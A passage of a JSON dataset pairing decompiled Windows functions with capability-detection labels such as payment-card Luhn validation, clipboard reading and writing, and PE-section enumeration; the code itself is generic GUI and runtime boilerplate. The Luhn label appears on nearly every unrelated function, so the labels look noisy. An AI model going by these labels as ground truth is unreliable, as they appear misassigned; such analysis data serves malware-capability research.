        "decompiled_code": "\nvoid fcn.0042ae74(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042b034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b034(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42b052;\n    fcn.0042ae68();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42b088;\n    uStack32 = 0x42b080;\n    fcn.0042ae74();\n    return;\n}\n",
        "token_count": 205
    },
    "0042b354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b354(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.004054c0();\n    puVar1 = fcn.0040a490();\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.004058fc();\n        fcn.00405b8c();\n        puVar1 = fcn.0040a490();\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0042b478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b478(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x42b48c;\n        fcn.00404964();\n    }\n    uStack44 = 0x42b4ea;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0042b354();\n    fcn.0042b3a4(arg_8h, arg_14h);\n    fcn.004054c0();\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x42b4f1;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 238
    },
    "0042b5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b5f0(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x42b6d0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x42b64b;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.004070f8();\n    uVar2 = 0x42b6e0;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x42b6e0, uVar1);\n    fcn.0042b52c();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x42b6d7;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 315
    },
    "0042b8c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b8c8(void)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_18h;\n    uint rclsid;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack72 = &stack0xfffffffc;\n    uStack64 = 0x42b99d;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    uStack76 = 0x42b92b;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack80;\n    fcn.0042b568();\n    uVar1 = fcn.004070f8();\n    iVar3 = 0x42b9ac;\n    puVar2 = &rclsid;\n    sub.ole32.dll_CoCreateInstance(puVar2, 0, 5, 0x42b9ac, uVar1);\n    fcn.0042b52c();\n    *in_FS_OFFSET = puVar2;\n    *in_FS_OFFSET = iVar3;\n    iStack80 = 0x42b9a4;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 329
    },
    "0042bf18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042bf18(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040db68(0, &var_8h);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 104
    },
    "0042c48c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0042c48c(void)\n\n{\n    int64_t iVar1;\n    float10 fVar2;\n    uint var_18h;\n    uint var_14h;\n    \n    fVar2 = fcn.0042c4d4(0, 0xa0000000, 0x4002);\n    iVar1 = fcn.00403444();\n    return iVar1 * fVar2;\n}\n",
        "token_count": 94
    },
    "0042c668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042c668(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0042cd18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cd18(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42cdb8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = fcn.0042cbf8();\n    *(iVar2 + 8) = *(in_EAX + 0x18);\n    fcn.00419680();\n    (**(*param_2 + 0x24))();\n    fcn.004070f8();\n    cVar1 = fcn.0040f8c8();\n    if (cVar1 != '\\0') {\n        fcn.00419680();\n    }\n    *(in_EAX + 0x18) = *(in_EAX + 0x18) + 1;\n    fcn.0040713c();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42cdbf;\n    uStack32 = 0x42cdb7;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 312
    },
    "0042cbf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042cbf8(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    fcn.00407110();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0042cc3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042cc3c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x14) = uVar1;\n    fcn.0040546c();\n    *(in_EAX + 0x18) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 219
    },
    "0042e264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042e264(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 140
    },
    "004303e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004303e0(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x4303fb;\n    fcn.00447014();\n    puStack40 = 0x430405;\n    fcn.0043ad38();\n    puStack40 = 0x43040d;\n    fcn.0043ab94();\n    uStack44 = 0x430489;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x430450;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x491314 = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 290
    },
    "00430568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00430568(void)\n\n{\n    uint uVar1;\n    \n    *0x497bb0 = sub.user32.dll_RegisterWindowMessageA(0x4305cc);\n    *0x497bb4 = sub.user32.dll_RegisterWindowMessageA(0x4305dc);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.0040aefc(uVar1);\n    *0x491318 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004308b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write clipboard data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004308b8(uint dwBytes)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hMem;\n    uint var_4h;\n    \n    puStack28 = 0x4308d3;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x43098a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = dwBytes;\n    uStack44 = 0x2002;\n    puStack48 = 0x4308ec;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_GlobalAlloc();\n    uStack52 = 0x43095c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x430906;\n    uStack60 = uVar1;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalLock();\n    uStack68 = 0x43094b;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.004030ec();\n    fcn.004307f4();\n    uVar2 = in_EDX & 0xffff;\n    sub.user32.dll_SetClipboardData(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    uStack72 = 0x430952;\n    sub.kernel32.dll_GlobalUnlock(uVar1);\n    return;\n}\n",
        "token_count": 466
    },
    "00430a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00430a48(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    uint arg_8h;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x430a5f;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x430af0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while( true ) {\n        if (uVar2 == 0) {\n            fcn.0040db2c();\n            fcn.00404eb4();\n            *in_FS_OFFSET = uStack40;\n            uStack32 = 0x430af7;\n            uStack36 = 0x430aef;\n            (**(*in_EAX + 0x14))();\n            return;\n        }\n        cVar1 = fcn.00426cac();\n        if (cVar1 != '\\0') break;\n        uStack40 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    sub.user32.dll_GetClipboardData(uVar2);\n    arg_8h = sub.user32.dll_GetClipboardData(9);\n    fcn.00426bbc(arg_8h);\n    fcn.00404f60();\n    return;\n}\n",
        "token_count": 378
    },
    "00430d88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430d88(uint param_1, uint32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x430d9c;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x430dcc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData();\n    *in_FS_OFFSET = param_2 & 0xffff;\n    uStack24 = 0x430dd3;\n    uStack28 = 0x430dcb;\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 213
    },
    "00431074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431074(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00449a28();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 147
    },
    "004317b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004317b8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00431708();\n    (***0x492870)(uVar1);\n    return;\n}\n",
        "token_count": 88
    },
    "00431804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431804(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00431708();\n    (***0x49282c)(uVar1);\n    return;\n}\n",
        "token_count": 76
    },
    "00431d14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431d14(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x431d2e;\n    var_4h = param_2;\n    uStack92 = fcn.00457a28();\n    puStack96 = 0x431d34;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.00431d14::nLeftRect;\n        uStack100 = 0x431d49;\n        uStack100 = fcn.00457a28();\n        iStack104 = 0x431d4f;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.00431d14::nLeftRect;\n        uStack116 = 0x431d64;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x431d6c;\n        uStack116 = fcn.00457a28();\n        puStack120 = 0x431d72;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x431e6f;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.00457a28(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.00431d14::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00418388(&fcn.00431d14::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.00431d14::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.004318b0();\n        uVar2 = 0;\n        fcn.00431804(0, &fcn.00431d14::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.00457a28(hdc, 0x431e76);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 957
    },
    "00433bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00433bfc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004047cc(),  cVar1 != '\\0')) {\n        fcn.004365a4();\n        fcn.00436a8c();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.004377f8();\n    }\n    fcn.004333a0();\n    return;\n}\n",
        "token_count": 135
    },
    "004355bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004355bc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "004363a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004363a0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405504();\n    return;\n}\n",
        "token_count": 234
    },
    "00436e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00436e3c(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.004333a0();\n    return 0;\n}\n",
        "token_count": 64
    },
    "00437178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.00437178(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4914d0,  iVar2 != *0x4914cc)) {\n        fcn.00436fd4();\n        *0x4914cc = iVar2;\n        uVar3 = *0x4914d0;\n    }\n    return uVar3;\n}\n",
        "token_count": 147
    },
    "004371b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004371b4(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "00438568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438568(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    uVar1 = param_2[1];\n    *(in_EAX + 0x58) = *param_2;\n    *(in_EAX + 0x5c) = uVar1;\n    return;\n}\n",
        "token_count": 86
    },
    "0043ad38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043ad38(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x491508;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x491508 = 0;\n    uStack36 = 0x43ade9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x491504 = 1;\n    uStack48 = 0x43adab;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043ace8, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x491504 = 0;\n    *0x491508 = uVar1;\n    return;\n}\n",
        "token_count": 288
    },
    "0043af4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nuint64_t fcn.0043af4c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    code *pcVar2;\n    uint uStack12;\n    uchar uStack8;\n    \n    uStack12 = sub.user32.dll_GetActiveWindow();\n    uStack8 = 0;\n    if (in_AL == '\\0') {\n        pcVar2 = fcn.0043aef4;\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043aef4, &uStack12);\n        sub.user32.dll_EnumThreadWindows(uVar1);\n    }\n    else {\n        pcVar2 = fcn.0043af14;\n        sub.user32.dll_EnumWindows(fcn.0043af14, &uStack12);\n    }\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 194
    },
    "0043b1b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043b1b8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43b229;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.0043b1a8();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.004075f4();\n        fcn.0040daac(in_stack_ffffffd4, arg_ch);\n        fcn.00404eb4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43b230;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 294
    },
    "0043b238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
